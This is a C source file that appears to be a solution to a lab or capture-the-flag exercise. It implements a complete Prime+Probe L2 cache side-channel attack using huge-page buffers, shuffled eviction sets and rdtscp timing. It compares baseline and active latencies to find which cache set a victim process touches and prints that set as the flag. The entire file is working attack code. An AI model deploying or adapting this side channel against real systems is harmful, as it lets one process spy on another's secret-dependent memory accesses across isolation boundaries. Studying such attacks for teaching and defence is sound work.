#include "util.h"
#include <sys/mman.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define BUFF_SIZE (1<<21)
#define L2_WAYS 16
#ifndef STRIDE
#define STRIDE (1<<16)
#endif

// Inline rdtscp for timing
static inline uint64_t rdtscp(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

// Linked list node
struct node {
    struct node *next;
    char pad[64 - sizeof(struct node *)]; // Pad to cache line size
};

void *buf;
struct node *sets[1024]; // Pointers to the start of each set's list

// Shuffle an array of pointers
void shuffle(struct node **array, int n) {
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        struct node *temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
}

// Build shuffled linked list for a set
void build_set(int set_index) {
    char *base = (char *)buf;
    struct node *nodes[L2_WAYS];
    
    for (int i = 0; i < L2_WAYS; i++) {
        nodes[i] = (struct node *)(base + set_index * 64 + i * STRIDE);
    }
    
    shuffle(nodes, L2_WAYS);
    
    for (int i = 0; i < L2_WAYS - 1; i++) {
        nodes[i]->next = nodes[i+1];
    }
    nodes[L2_WAYS-1]->next = NULL;
    
    sets[set_index] = nodes[0];
}

// Prime the current set
void prime_set(int set_index) {
    struct node *curr = sets[set_index];
    while (curr) {
        curr = curr->next;
    }
}

// Probe the current set and return the access time
uint64_t probe_set(int set_index) {
    uint64_t start = rdtscp();
    struct node *curr = sets[set_index];
    while (curr) {
        curr = curr->next;
    }
    uint64_t end = rdtscp();
    return end - start;
}

// Structure to store results for sorting
typedef struct {
    int set_index;
    uint64_t latency;
} Result;

int compare_results(const void *a, const void *b) {
    Result *r1 = (Result *)a;
    Result *r2 = (Result *)b;
    if (r2->latency > r1->latency) return 1;
    if (r2->latency < r1->latency) return -1;
    return 0;
}

int main(int argc, char const *argv[]) {
    srand(time(NULL));

    // Allocate huge page
    buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (buf == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    
    *((char *)buf) = 1; // dummy write

    printf("Building sets...\n");
    for (int i = 0; i < 1024; i++) {
        build_set(i);
    }

    // --- PHASE 1: CALIBRATION (Baseline) ---
    // We assume the victim is NOT running during this phase, OR we rely on the fact that
    // the victim only affects ONE set, while system noise affects specific sets consistently.
    // Ideally, we would ask the user to start victim AFTER calibration.
    // But since we can't control that, let's just measure "background" noise.
    // If the victim IS running, it will be part of the baseline, which is bad.
    // However, we can try to detect "spikes" relative to a "quiet" baseline.
    
    printf("\n--- PHASE 1: BASELINE CALIBRATION ---\n");
    printf("Measuring background noise levels for all sets...\n");
    
    uint64_t baseline[1024];
    int calibration_passes = 20;
    int samples = 200;

    for (int i = 0; i < 1024; i++) baseline[i] = 0;

    for (int p = 0; p < calibration_passes; p++) {
        for (int i = 0; i < 1024; i++) {
            uint64_t total = 0;
            for (int k = 0; k < samples; k++) {
                prime_set(i);
                // No wait or very short wait for baseline to capture "intrinsic" slowness
                for(volatile int w=0; w<100; w++); 
                total += probe_set(i);
            }
            baseline[i] += (total / samples);
        }
    }
    for (int i = 0; i < 1024; i++) baseline[i] /= calibration_passes;

    // Identify naturally hot sets
    printf("Top 5 Noisiest Sets (Baseline):\n");
    Result sorted_baseline[1024];
    for(int i=0; i<1024; i++) {
        sorted_baseline[i].set_index = i;
        sorted_baseline[i].latency = baseline[i];
    }
    qsort(sorted_baseline, 1024, sizeof(Result), compare_results);
    for(int i=0; i<5; i++) {
        printf("Set %d: %llu cycles\n", sorted_baseline[i].set_index, (unsigned long long)sorted_baseline[i].latency);
    }

    // --- PHASE 2: ACTIVE SCAN ---
    printf("\n--- PHASE 2: ACTIVE SCAN ---\n");
    printf("Scanning for victim activity (relative to baseline)...\n");
    
    uint64_t active[1024];
    int active_passes = 50;
    
    for (int i = 0; i < 1024; i++) active[i] = 0;

    for (int p = 0; p < active_passes; p++) {
        if (p % 10 == 0) { printf("Pass %d/%d...\n", p+1, active_passes); fflush(stdout); }
        for (int i = 0; i < 1024; i++) {
            uint64_t total = 0;
            for (int k = 0; k < samples; k++) {
                prime_set(i);
                // Longer wait to catch victim
                for(volatile int w=0; w<2000; w++); 
                total += probe_set(i);
            }
            active[i] += (total / samples);
        }
    }
    for (int i = 0; i < 1024; i++) active[i] /= active_passes;

    // --- PHASE 3: DIFFERENTIAL ANALYSIS ---
    printf("\n--- PHASE 3: ANALYSIS ---\n");
    Result diffs[1024];
    for (int i = 0; i < 1024; i++) {
        diffs[i].set_index = i;
        // Calculate increase relative to baseline
        // If baseline is high, a small increase might be noise.
        // We look for the largest ABSOLUTE increase, but maybe normalize?
        // Let's just do simple subtraction: Active - Baseline
        if (active[i] > baseline[i]) {
            diffs[i].latency = active[i] - baseline[i];
        } else {
            diffs[i].latency = 0;
        }
    }

    qsort(diffs, 1024, sizeof(Result), compare_results);

    printf("Top 5 Sets with Largest Latency Increase:\n");
    for (int i = 0; i < 5; i++) {
        printf("Set %d: +%llu cycles (Base: %llu -> Active: %llu)\n", 
               diffs[i].set_index, 
               (unsigned long long)diffs[i].latency, 
               (unsigned long long)baseline[diffs[i].set_index],
               (unsigned long long)active[diffs[i].set_index]);
    }

    // Heuristic: The one with the biggest jump is likely the victim.
    // System noise sets (like 879) are usually high in BOTH baseline and active,
    // so their "diff" should be small (or at least smaller than the victim's jump).
    
    printf("\nDetected Flag: %d\n", diffs[0].set_index);
    
    return 0;
}
